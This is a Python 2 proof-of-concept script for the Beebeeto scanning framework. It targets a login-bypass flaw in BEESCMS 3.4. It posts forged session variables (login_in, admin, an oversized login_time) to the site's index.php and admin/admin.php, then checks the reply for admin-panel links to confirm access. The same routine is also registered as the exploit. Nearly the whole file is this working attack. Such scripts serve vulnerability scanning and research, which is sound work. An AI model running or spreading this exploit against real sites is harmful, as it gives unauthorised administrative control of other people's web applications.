#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2
import cookielib

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0052',
            'name': 'BEESCMS 3.4 /admin/admin.php 登录绕过漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-10-05',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'BEESCMS',
            'vul_version': ['3.4'],
            'type': 'Login Bypass',
            'tag': ['Login Bypass', '登录绕过', 'BEESCMS漏洞'],
            'desc': 'BEESCMS v3.4 /includes/fun.php 弱验证导致后台验证绕过',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-059180',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        urllib2.install_opener(opener)
        postdata = "_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=300000000000000000000000\r\n"
        # get session
        request = urllib2.Request(args['options']['target'] + "/index.php", data=postdata)
        r = urllib2.urlopen(request)
        # login test
        request2 = urllib2.Request(args['options']['target'] + "/admin/admin.php", data=postdata)
        r = urllib2.urlopen(request2)
        content = r.read()
        if "admin_form.php?action=form_list&nav=list_order" in content:
            if "admin_main.php?nav=main" in content:
                args['success'] = True
                args['test_method'] = 'http://www.wooyun.org/bugs/wooyun-2014-059180'
                return args
        args['success'] = False
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
